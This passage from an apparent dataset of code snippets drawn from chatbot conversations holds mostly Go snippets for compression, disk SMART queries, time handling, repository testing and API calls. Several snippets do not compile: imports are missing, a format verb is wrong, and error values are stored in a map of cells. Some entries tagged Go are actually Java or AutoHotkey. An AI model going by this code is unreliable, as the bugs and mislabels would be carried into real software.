:= start; i < end; i++ {\n\t\t\tresult = append(result, result[i])\n\t\t}\n\n\t\tresult = append(result, t.nextByte)\n\t}\n\n\treturn result\n}\n\n// Znajduje najdłuższe dopasowanie dla danego fragmentu wejściowego względem bufora\nfunc findLongestMatch(buffer []byte) (int, int) {\n\tmatchPos, matchLen := 0, 0\n\n\tfor i := 0; i < len(buffer)-1; i++ {\n\t\tfor j := i + 1; j < len(buffer); j++ {\n\t\t\tk := 0\n\t\t\tfor i+k < len(buffer) && buffer[i+k] == buffer[j+k] {\n\t\t\t\tk++\n\t\t\t}\n\n\t\t\tif k > matchLen {\n\t\t\t\tmatchPos, matchLen = i, k\n\t\t\t}\n\t\t}\n\t}\n\n\treturn matchPos, matchLen\n}\n\n// Funkcje pomocnicze do obliczania maksimum i minimum\nfunc max(a, b int) int {\n\tif a > b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc min(a, b int) int {\n\tif a < b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc main() {\n\t// Pobierz argumenty z linii poleceń (nazwa pliku wejściowego i wyjściowego)\n\targs := os.Args[1:]\n\tif len(args) != 2 {\n\t\tlog.Fatal(\"Podaj nazwę pliku wejściowego i wyjściowego\")\n\t}\n\n\tinputFile, err := os.Open(args[0])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer inputFile.Close()\n\n\toutputFile, err := os.Create(args[1])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer outputFile.Close()\n\n\t// Odczytaj dane z pliku wejściowego\n\tinputData := make([]byte, 0)\n\tbuffer := make([]byte, 1024)\n\tfor {\n\t\tn, err := inputFile.Read(buffer)\n\t\tif err == io.EOF {\n\t\t\tbreak\n\t\t}\n\t\tinputData = append(inputData, buffer[:n]...)\n\t}\n\n\t// Kompresuj dane\n\tcompressedData := compress(inputData)\n\n\t// Zapisz skompresowane dane do pliku wyjściowego (jako dane binarne)\n\tfor _, t := range compressedData {\n\t\tbinary.Write(outputFile, binary.LittleEndian, t)\n\t}\n}",
    "filename": "3a39654209bd5e69f1ca846cefd71671_4.go"
  },
  {
    "conversation_hash": "3a39654209bd5e69f1ca846cefd71671",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "// Znajduje najdłuższe dopasowanie dla danego fragmentu wejściowego względem bufora\nfunc findLongestMatch(buffer []byte) (int, int) {\n\tmatchPos, matchLen := 0, 0\n\n\tfor i := 0; i < len(buffer)-1; i++ {\n\t\tfor j := i + 1; j < len(buffer); j++ {\n\t\t\tk := 0\n\t\t\tfor i+k < len(buffer) && j+k < len(buffer) && buffer[i+k] == buffer[j+k] {\n\t\t\t\tk++\n\t\t\t}\n\n\t\t\tif k > matchLen {\n\t\t\t\tmatchPos, matchLen = i, k\n\t\t\t}\n\t\t}\n\t}\n\n\treturn matchPos, matchLen\n}",
    "filename": "3a39654209bd5e69f1ca846cefd71671_7.go"
  },
  {
    "conversation_hash": "3a39654209bd5e69f1ca846cefd71671",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "inputData := make([]byte, 0)\nbuffer := make([]byte, bufferSize)\nfor {\n\tn, err := inputFile.Read(buffer)\n\tif err == io.EOF {\n\t\tbreak\n\t}\n\tinputData = append(inputData, buffer[:n]...)\n}",
    "filename": "3a39654209bd5e69f1ca846cefd71671_8.go"
  },
  {
    "conversation_hash": "42f54ddb588eccccd0e0ede3918f4968",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "// Kod źródłowy w języku Go\n\npackage main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nconst base = 128\n\n// Funkcja do kodowania danych za pomocą Base128\nfunc encodeBase128(input string) []int {\n\tresult := []int{}\n\tfor _, char := range input {\n\t\tresult = append(result, int(char))\n\t}\n\treturn result\n}\n\n// Funkcja do dekodowania danych z Base128\nfunc decodeBase128(input []int) string {\n\tresult := \"\"\n\tfor _, code := range input {\n\t\tresult += string(rune(code))\n\t}\n\treturn result\n}\n\n// Główna funkcja programu\nfunc main() {\n\t// Logika programu...\n}",
    "filename": "42f54ddb588eccccd0e0ede3918f4968_0.go"
  },
  {
    "conversation_hash": "386fb7bf9adfb582be2eea7660126b20",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func (r *EUtranCellRepository) groupsEran(name string, owners []string) (model.EUtranCellsGroups, error) {\n\tgroups := make(model.EUtranCellsGroups)\n\tnewOwners := make([]string, 0, len(owners)) // Create a new slice to store valid owners\n\n\tfor _, cellsGroupLabel := range owners {\n\t\tcells, err := r.cellsv2(name, cellsGroupLabel)\n\t\tif err != nil {\n\t\t\tcontinue // Skip to the next iteration if an error occurs\n\t\t}\n\t\tgroups[cellsGroupLabel] = cells\n\t\tnewOwners = append(newOwners, cellsGroupLabel) // Add the valid owner to the newOwners slice\n\t}\n\tgroups.RemoveEmpty()\n\n\t// If there are no valid owners, return an error\n\tif len(newOwners) == 0 {\n\t\treturn groups, errors.New(\"No valid owners found\")\n\t}\n\n\treturn groups, nil\n}",
    "filename": "386fb7bf9adfb582be2eea7660126b20_0.go"
  },
  {
    "conversation_hash": "386fb7bf9adfb582be2eea7660126b20",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func (r *EUtranCellRepository) groupsEran(name string, owners []string) (model.EUtranCellsGroups, error) {\n\tgroups := make(model.EUtranCellsGroups)\n\n\tfor _, cellsGroupLabel := range owners {\n\t\tcells, err := r.cellsv2(name, cellsGroupLabel)\n\t\tif err != nil {\n\t\t\t// Catch the error as a string and store it in the cells variable\n\t\t\tgroups[cellsGroupLabel] = errors.New(\"No cells found\")\n\t\t\tcontinue\n\t\t}\n\t\tgroups[cellsGroupLabel] = cells\n\t}\n\n\tgroups.RemoveEmpty()\n\treturn groups, nil\n}",
    "filename": "386fb7bf9adfb582be2eea7660126b20_1.go"
  },
  {
    "conversation_hash": "386fb7bf9adfb582be2eea7660126b20",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func (r *EUtranCellRepository) groupsEran(name string, owners []string) (model.EUtranCellsGroups, error) {\n\tgroups := make(model.EUtranCellsGroups)\n\n\tfor _, cellsGroupLabel := range owners {\n\t\tcells, err := r.cellsv2(name, cellsGroupLabel)\n\t\tif err != nil {\n\t\t\t// Custom error message\n\t\t\terrMsg := \"No cells found for \" + cellsGroupLabel\n\t\t\tgroups[cellsGroupLabel] = &customError{errMsg} // Assign custom error type to the map\n\t\t\tcontinue\n\t\t}\n\t\tgroups[cellsGroupLabel] = cells\n\t}\n\n\tgroups.RemoveEmpty()\n\treturn groups, nil\n}\n\n// Define custom error type\ntype customError struct {\n\tmsg string\n}\n\n// Implement the error interface's Error() method\nfunc (e *customError) Error() string {\n\treturn e.msg\n}",
    "filename": "386fb7bf9adfb582be2eea7660126b20_3.go"
  },
  {
    "conversation_hash": "386fb7bf9adfb582be2eea7660126b20",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func (r *EUtranCellRepository) groupsEran(name string, owners []string) (model.EUtranCellsGroups, error) {\n\tgroups := make(model.EUtranCellsGroups)\n\n\tfor _, cellsGroupLabel := range owners {\n\t\tcells, err := r.cellsv2(name, cellsGroupLabel)\n\t\tif err != nil {\n\t\t\t// Placeholder empty EUtranCells value for error\n\t\t\tgroups[cellsGroupLabel] = &model.EUtranCells{}\n\t\t\tcontinue\n\t\t}\n\t\tgroups[cellsGroupLabel] = cells\n\t}\n\n\tgroups.RemoveEmpty()\n\treturn groups, nil\n}",
    "filename": "386fb7bf9adfb582be2eea7660126b20_4.go"
  },
  {
    "conversation_hash": "1191bb9c5360e3616161d13652e41ba0",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\t// 使用 time.Parse() 函数将字符串转换为时间\n\tlayout := \"2006-01-02 15:04:05\"\n\tstr := \"2021-10-15 12:34:56\"\n\tt, err := time.Parse(layout, str)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tfmt.Println(\"Parsed time:\", t)\n\n\t// 使用 time.Date() 函数创建一个具有指定年、月、日、时、分、秒和纳秒的时间\n\tspecifiedTime := time.Date(2022, time.December, 25, 10, 30, 0, 0, time.UTC)\n\tfmt.Println(\"Specified time:\", specifiedTime)\n}",
    "filename": "1191bb9c5360e3616161d13652e41ba0_1.go"
  },
  {
    "conversation_hash": "1191bb9c5360e3616161d13652e41ba0",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\t// 获取当前时间\n\tnow := time.Now()\n\tfmt.Println(\"当前时间:\", now)\n\n\t// 延后15天\n\texp_time := now.AddDate(0, 0, 15)\n\tfmt.Println(\"延后15天后的时间:\", exp_time)\n}",
    "filename": "1191bb9c5360e3616161d13652e41ba0_2.go"
  },
  {
    "conversation_hash": "6b3d56ac20b4a84a00d06991300883e6",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "try {\n    // bloque de código donde se pueden generar excepciones\n} catch(Exception e) {\n    try {\n        // bloque de código para manejar la excepción capturada en el catch anterior\n    } catch(Exception ex) {\n        // bloque de código para manejar la excepción capturada en el catch interno\n    }\n}",
    "filename": "6b3d56ac20b4a84a00d06991300883e6_1.go"
  },
  {
    "conversation_hash": "206b1bb035563e1689a308c018e1956e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// Ustaw repozytorium, które chcesz sprawdzić\n\trepository := \"https://github.com/nazwa_uzytkownika/nazwa_repozytorium.git\"\n\n\t// Klonuj repozytorium do tymczasowego katalogu\n\ttmpDir := \"/tmp/repo\"\n\terr := os.RemoveAll(tmpDir)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tcmd := exec.Command(\"git\", \"clone\", repository, tmpDir)\n\terr = cmd.Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Przejdź do katalogu repozytorium\n\terr = os.Chdir(tmpDir)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Wykonaj sprawdzanie błędów\n\terr = runCommand(\"make\", \"test\")\n\tif err != nil {\n\t\tlog.Printf(\"Wystąpiły błędy w repozytorium: %v\", err)\n\t} else {\n\t\tfmt.Println(\"Brak błędów w repozytorium.\")\n\t}\n}\n\nfunc runCommand(name string, args ...string) error {\n\tcmd := exec.Command(name, args...)\n\tcmd.Stdout = os.Stdout\n\tcmd.Stderr = os.Stderr\n\treturn cmd.Run()\n}",
    "filename": "206b1bb035563e1689a308c018e1956e_2.go"
  },
  {
    "conversation_hash": "206b1bb035563e1689a308c018e1956e",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// Sprawdź, czy podano ścieżkę dostępu do repozytorium jako argument\n\tif len(os.Args) != 2 {\n\t\tfmt.Println(\"Podaj ścieżkę dostępu do repozytorium jako argument.\")\n\t\treturn\n\t}\n\trepository := os.Args[1]\n\n\t// Klonuj repozytorium do tymczasowego katalogu\n\ttmpDir := \"/tmp/repo\"\n\terr := os.RemoveAll(tmpDir)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tcmd := exec.Command(\"git\", \"clone\", repository, tmpDir)\n\terr = cmd.Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Przejdź do katalogu repozytorium\n\terr = os.Chdir(tmpDir)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Wykonaj sprawdzanie błędów\n\terr = runCommand(\"make\", \"test\")\n\tif err != nil {\n\t\tlog.Printf(\"Wystąpiły błędy w repozytorium: %v\", err)\n\t} else {\n\t\tfmt.Println(\"Brak błędów w repozytorium.\")\n\t}\n}\n\nfunc runCommand(name string, args ...string) error {\n\tcmd := exec.Command(name, args...)\n\tcmd.Stdout = os.Stdout\n\tcmd.Stderr = os.Stderr\n\treturn cmd.Run()\n}",
    "filename": "206b1bb035563e1689a308c018e1956e_3.go"
  },
  {
    "conversation_hash": "0587ebdb0e17373e8f92e8a878829bce",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"smartctl\", \"-a\", \"/dev/sda\") // Zmień \"/dev/sda\" na odpowiednią ścieżkę do podłączonego dysku\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tsmartInfo := parseSmartctlOutput(string(output))\n\tdisplaySmartInfo(smartInfo)\n}\n\ntype SmartInfo struct {\n\tModel       string\n\tSerialNum   string\n\tFirmwareVer string\n\t// Dodaj inne dane SMART, które chcesz wyświetlić\n}\n\nfunc parseSmartctlOutput(output string) SmartInfo {\n\tlines := strings.Split(output, \"\\n\")\n\tinfo := SmartInfo{}\n\n\tfor _, line := range lines {\n\t\tif line == \"\" {\n\t\t\tcontinue\n\t\t}\n\n\t\tfields := strings.Fields(line)\n\t\tswitch fields[0] {\n\t\tcase \"Model\":\n\t\t\tinfo.Model = strings.Join(fields[2:], \" \")\n\t\tcase \"Serial\":\n\t\t\tinfo.SerialNum = fields[2]\n\t\tcase \"Firmware\":\n\t\t\tinfo.FirmwareVer = fields[2]\n\t\t\t// Dodaj inne przypadki, aby sparsować inne dane SMART\n\t\t}\n\t}\n\n\treturn info\n}\n\nfunc displaySmartInfo(info SmartInfo) {\n\tfmt.Println(\"Model: \", info.Model)\n\tfmt.Println(\"Serial Number: \", info.SerialNum)\n\tfmt.Println(\"Firmware Version: \", info.FirmwareVer)\n\t// Dodaj inne wyświetlane dane SMART\n\t// Pamiętaj, żeby wielkość liter w polach odpowiadała polom strukturze SmartInfo\n}",
    "filename": "0587ebdb0e17373e8f92e8a878829bce_0.go"
  },
  {
    "conversation_hash": "0587ebdb0e17373e8f92e8a878829bce",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"cmd\", \"/c\", \"wmic\", \"diskdrive\", \"get\", \"model,serialnumber,firmwareversion,status\")\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tsmartInfo := parseWmicOutput(string(output))\n\tdisplaySmartInfo(smartInfo)\n}\n\ntype SmartInfo struct {\n\tModel       string\n\tSerialNum   string\n\tFirmwareVer string\n\t// Dodaj inne dane SMART, które chcesz wyświetlić\n}\n\nfunc parseWmicOutput(output string) SmartInfo {\n\tlines := strings.Split(output, \"\\n\")\n\tinfo := SmartInfo{}\n\n\tfor _, line := range lines {\n\t\tif line == \"\" || line == \"Model  SerialNumber  FirmwareVersion  Status\" {\n\t\t\tcontinue\n\t\t}\n\n\t\tfields := strings.Fields(line)\n\t\tinfo.Model = fields[0]\n\t\tinfo.SerialNum = fields[1]\n\t\tinfo.FirmwareVer = fields[2]\n\t\t// Dodaj inne przypadki, aby sparsować inne dane SMART\n\t\tbreak\n\t}\n\n\treturn info\n}\n\nfunc displaySmartInfo(info SmartInfo) {\n\tfmt.Println(\"Model: \", info.Model)\n\tfmt.Println(\"Serial Number: \", info.SerialNum)\n\tfmt.Println(\"Firmware Version: \", info.FirmwareVer)\n\t// Dodaj inne wyświetlane dane SMART\n\t// Pamiętaj, żeby wielkość liter w polach odpowiadała polom struktury SmartInfo\n}",
    "filename": "0587ebdb0e17373e8f92e8a878829bce_1.go"
  },
  {
    "conversation_hash": "0587ebdb0e17373e8f92e8a878829bce",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"cmd\", \"/c\", \"wmic\", \"diskdrive\", \"get\", \"model,serialnumber,firmwareversion,status\")\n\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x0100}\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tsmartInfo := parseWmicOutput(string(output))\n\tdisplaySmartInfo(smartInfo)\n}\n\n// reszta kodu pozostaje taka sama",
    "filename": "0587ebdb0e17373e8f92e8a878829bce_2.go"
  },
  {
    "conversation_hash": "0587ebdb0e17373e8f92e8a878829bce",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n\n\t\"golang.org/x/sys/windows\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"cmd\", \"/c\", \"wmic\", \"diskdrive\", \"get\", \"model,serialnumber,firmwareversion,status\")\n\tcmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true, CreationFlags: windows.CREATE_UNICODE_ENVIRONMENT}\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tsmartInfo := parseWmicOutput(string(output))\n\tdisplaySmartInfo(smartInfo)\n}\n\n// reszta kodu pozostaje taka sama",
    "filename": "0587ebdb0e17373e8f92e8a878829bce_3.go"
  },
  {
    "conversation_hash": "0587ebdb0e17373e8f92e8a878829bce",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"cmd\", \"/c\", \"wmic\", \"diskdrive\", \"get\", \"model,serialnumber,firmwareversion,status\")\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tsmartInfo := parseWmicOutput(string(output))\n\tdisplaySmartInfo(smartInfo)\n}\n\ntype SmartInfo struct {\n\tModel       string\n\tSerialNum   string\n\tFirmwareVer string\n\t// Dodaj inne dane SMART, które chcesz wyświetlić\n}\n\nfunc parseWmicOutput(output string) SmartInfo {\n\tlines := strings.Split(output, \"\\n\")\n\tinfo := SmartInfo{}\n\n\tfor _, line := range lines {\n\t\tif line == \"\" || line == \"Model  SerialNumber  FirmwareVersion  Status\" {\n\t\t\tcontinue\n\t\t}\n\n\t\tfields := strings.Fields(line)\n\t\tinfo.Model = fields[0]\n\t\tinfo.SerialNum = fields[1]\n\t\tinfo.FirmwareVer = fields[2]\n\t\t// Dodaj inne przypadki, aby sparsować inne dane SMART\n\t\tbreak\n\t}\n\n\treturn info\n}\n\nfunc displaySmartInfo(info SmartInfo) {\n\tfmt.Println(\"Model: \", info.Model)\n\tfmt.Println(\"Serial Number: \", info.SerialNum)\n\tfmt.Println(\"Firmware Version: \", info.FirmwareVer)\n\t// Dodaj inne wyświetlane dane SMART\n\t// Pamiętaj, żeby wielkość liter w polach odpowiadała polom struktury SmartInfo\n}",
    "filename": "0587ebdb0e17373e8f92e8a878829bce_4.go"
  },
  {
    "conversation_hash": "0587ebdb0e17373e8f92e8a878829bce",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"cmd\", \"/c\", \"wmic\", \"diskdrive\", \"get\", \"model,serialnumber,firmwareversion,status\")\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tsmartInfo := parseWmicOutput(string(output))\n\tdisplaySmartInfo(smartInfo)\n}\n\ntype SmartInfo struct {\n\tModel       string\n\tSerialNum   string\n\tFirmwareVer string\n\t// Dodaj inne dane SMART, które chcesz wyświetlić\n}\n\nfunc parseWmicOutput(output string) SmartInfo {\n\tlines := strings.Split(output, \"\\n\")\n\tinfo := SmartInfo{}\n\n\tfor _, line := range lines {\n\t\tif line == \"\" || line == \"Model  SerialNumber  FirmwareVersion  Status\" {\n\t\t\tcontinue\n\t\t}\n\n\t\tfields := strings.Fields(line)\n\t\tinfo.Model = fields[0]\n\t\tinfo.SerialNum = fields[1]\n\t\tinfo.FirmwareVer = fields[2]\n\t\t// Dodaj inne przypadki, aby sparsować inne dane SMART\n\t\tbreak\n\t}\n\n\treturn info\n}\n\nfunc displaySmartInfo(info SmartInfo) {\n\tfmt.Println(\"Model: \", info.Model)\n\tfmt.Println(\"Serial Number: \", info.SerialNum)\n\tfmt.Println(\"Firmware Version: \", info.FirmwareVer)\n\t// Dodaj inne wyświetlane dane SMART\n\t// Pamiętaj, żeby wielkość liter w polach odpowiadała polom struktury SmartInfo\n}",
    "filename": "0587ebdb0e17373e8f92e8a878829bce_5.go"
  },
  {
    "conversation_hash": "55b4f8cfc90f053dcd8d947a47590cd6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\"smartctl\", \"-a\", \"/dev/sda\") // Zmien \"/dev/sda\" na odpowiednia sciezke do podlaczonego dysku\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tsmartInfo := parseSmartctlOutput(string(output))\n\tdisplaySmartInfo(smartInfo)\n}\n\ntype SmartInfo struct {\n\tModel       string\n\tSerialNum   string\n\tFirmwareVer string\n\t// Dodaj inne dane SMART, ktore chcesz wyswietlic\n}\n\nfunc parseSmartctlOutput(output string) SmartInfo {\n\tlines := strings.Split(output, \"\\n\")\n\tinfo := SmartInfo{}\n\n\tfor _, line := range lines {\n\t\tif line == \"\" {\n\t\t\tcontinue\n\t\t}\n\n\t\tfields := strings.Fields(line)\n\t\tswitch fields[0] {\n\t\tcase \"Model\":\n\t\t\tinfo.Model = strings.Join(fields[2:], \" \")\n\t\tcase \"Serial\":\n\t\t\tinfo.SerialNum = fields[2]\n\t\tcase \"Firmware\":\n\t\t\tinfo.FirmwareVer = fields[2]\n\t\t\t// Dodaj inne przypadki, aby sparsowac inne dane SMART\n\t\t}\n\t}\n\n\treturn info\n}\n\nfunc displaySmartInfo(info SmartInfo) {\n\tfmt.Println(\"Model: \", info.Model)\n\tfmt.Println(\"Serial Number: \", info.SerialNum)\n\tfmt.Println(\"Firmware Version: \", info.FirmwareVer)\n\t// Dodaj inne wyswietlane dane SMART\n\t// Pamietaj, zeby wielkosc liter w polach odpowiadala polom strukturze SmartInfo\n}",
    "filename": "55b4f8cfc90f053dcd8d947a47590cd6_0.go"
  },
  {
    "conversation_hash": "1cef4f186efd38c6218bec04f9f05ada",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "^c::\n   String := \"\" ; Initialize the String variable\n   Clipboard =  ; Empty the Clipboard\n   \n   ; Check if a specific string is selected\n   IfWinActive, Notepad\n   {\n      SendInput, ^c  ; Send Ctrl+C to copy selected text\n      ClipWait, 1  ; Wait for the Clipboard to contain data\n      String := Clipboard ; Store the copied text\n      String := RegExReplace(String, \"[\\r\\n]+\", \" \") ; Replace line breaks with spaces\n      String := Trim(String) ; Trim leading and trailing spaces\n   }\n   \n   ; If no specific string is selected, copy the entire line\n   If String = \"\"\n   {\n      SendInput, {home}+{end}^c ; Select the whole line and copy it\n      ClipWait, 1 ; Wait for the Clipboard to contain data\n      String := Clipboard ; Store the copied line\n   }\n   \n   return\n\n^v::\n   IfWinActive, Notepad\n   {\n      ClipboardTemp := Clipboard ; Save the Clipboard data\n      Clipboard := String ; Assign the stored text to the Clipboard\n      SendInput, ^v ; Paste the Clipboard contents\n      Sleep, 100 ; Wait for a moment for the paste to complete\n      Clipboard := ClipboardTemp ; Restore the original Clipboard data\n   }\n   return",
    "filename": "1cef4f186efd38c6218bec04f9f05ada_1.go"
  },
  {
    "conversation_hash": "1cef4f186efd38c6218bec04f9f05ada",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "Loop, 5 ; Change the number \"5\" to the desired iteration count\n{\n   ; Copy operation\n   Clipboard =  ; Empty the Clipboard\n   Send, ^c  ; Send Ctrl+C to copy selected text\n   ClipWait, 1  ; Wait for the Clipboard to contain data\n   CopyText := Clipboard ; Store the copied text\n\n   ; Paste operation\n   Clipboard := CopyText ; Assign the stored text to the Clipboard\n   Send, ^v ; Send Ctrl+V to paste the Clipboard contents\n   Sleep, 200 ; Wait for a moment before the next iteration\n}\nreturn",
    "filename": "1cef4f186efd38c6218bec04f9f05ada_2.go"
  },
  {
    "conversation_hash": "cd7926d15a65e2e654f6fa67931392ca",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype Article struct {\n\tTitle string `json:\"title\"`\n}\n\nfunc main() {\n\t// Wysyłanie żądania GET do dev.to API\n\tresp, err := http.Get(\"https://dev.to/api/articles\")\n\tif err != nil {\n\t\tfmt.Println(\"Wystąpił błąd przy wysyłaniu żądania:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\t// Analizowanie odpowiedzi JSON\n\tvar articles []Article\n\terr = json.NewDecoder(resp.Body).Decode(&articles)\n\tif err != nil {\n\t\tfmt.Println(\"Wystąpił błąd przy analizowaniu odpowiedzi:\", err)\n\t\treturn\n\t}\n\n\t// Wyświetlanie tytułów artykułów\n\tfmt.Println(\"Najnowsze artykuły na dev.to:\")\n\tfor _, article := range articles {\n\t\tfmt.Println(\" -\", article.Title)\n\t}\n}",
    "filename": "cd7926d15a65e2e654f6fa67931392ca_1.go"
  },
  {
    "conversation_hash": "134ac3393f074d162b33528f5ab3ad25",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Wprowadź swoją datę urodzenia w formacie \"YYYY-MM-DD\"\n\tfmt.Print(\"Podaj swoją datę urodzenia (YYYY-MM-DD): \")\n\tvar dateOfBirth string\n\tfmt.Scanln(&dateOfBirth)\n\n\t// Pobierz bieżącą datę\n\tcurrentDate := time.Now()\n\n\t// Parsuj datę urodzenia\n\tbirthDate, err := time.Parse(\"2006-01-02\", dateOfBirth)\n\tif err != nil {\n\t\tfmt.Println(\"Nieprawidłowy format daty!\")\n\t\treturn\n\t}\n\n\t// Oblicz różnicę pomiędzy datą urodzenia a bieżącą datą\n\tage := currentDate.Year() - birthDate.Year()\n\n\t// Wyświetl biometry\n\tfmt.Printf(\"Twój wiek: %d lat\\n\", age)\n\tfmt.Printf(\"Twój wiek w miesiącach: %d miesięcy\\n\", age*12)\n\tfmt.Printf(\"Twój wiek w tygodniach: %d tygodni\\n\", (currentDate.Sub(birthDate).Hours())/24/7)\n\tfmt.Printf(\"Twój wiek w dniach: %d dni\\n\", int(currentDate.Sub(birthDate).Hours())/24)\n\tfmt.Printf(\"Twój wiek w godzinach: %.0f godzin\\n\", currentDate.Sub(birthDate).Hours())\n\tfmt.Printf(\"Twój wiek w minutach: %.0f minut\\n\", currentDate.Sub(birthDate).Minutes())\n\tfmt.Printf(\"Twój wiek w sekundach: %.0f sekund\\n\", currentDate.Sub(birthDate).Seconds())\n}",
    "filename": "134ac3393f074d162b33528f5ab3ad25_0.go"
  },
  {
    "conversation_hash": "ef359361df6bcf33f5c2d2ff889ce50e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc recordShellToGif(outputFilePath string) error {\n\t// Tworzenie bufora dla nagrania\n\tvar buf bytes.Buffer\n\n\t// Uruchomienie powłoki\n\tshell := exec.Command(\"bash\")\n\n\t// Podłączenie bufora jako strumienia wejściowego i wyjściowego powłoki\n\tshell.Stdin = os.Stdin\n\tshell.Stdout = &buf\n\tshell.Stderr = &buf\n\n\t// Rozpoczęcie nagrywania\n\tif err := shell.Start(); err != nil {\n\t\treturn fmt.Errorf(\"nie można uruchomić powłoki: %w\", err)\n\t}\n\n\t// Oczekiwanie na zakończenie powłoki\n\tif err := shell.Wait(); err != nil {\n\t\treturn fmt.Errorf(\"powłoka zawiodła: %w\", err)\n\t}\n\n\t// Zapisanie nagrania do pliku GIF\n\tfile, err := os.Create(outputFilePath)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"nie można utworzyć pliku: %w\", err)\n\t}\n\tdefer file.Close()\n\n\t// Konwertowanie bufora z nagrania do pliku GIF\n\terr = asciicastToGif(&buf, file)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"nie można przekonwertować na GIF: %w\", err)\n\t}\n\n\treturn nil\n}\n\nfunc asciicastToGif(asciicast io.Reader, output io.Writer) error {\n\t// Tworzenie procesu asciinema\n\tasciinema := exec.Command(\"asciicast2gif\", \"-\")\n\n\t// Ustawienie strumienia wejściowego jako nagranie asciinema\n\tasciinema.Stdin = asciicast\n\n\t// Ustawienie strumienia wyjściowego jako plik GIF\n\tasciinema.Stdout = output\n\n\t// Uruchomienie konwersji\n\terr := asciinema.Run()\n\tif err != nil {\n\t\treturn fmt.Errorf(\"nie można przekonwertować na GIF: %w\", err)\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\toutputFilePath := \"output.gif\"\n\n\terr := recordShellToGif(outputFilePath)\n\tif err != nil 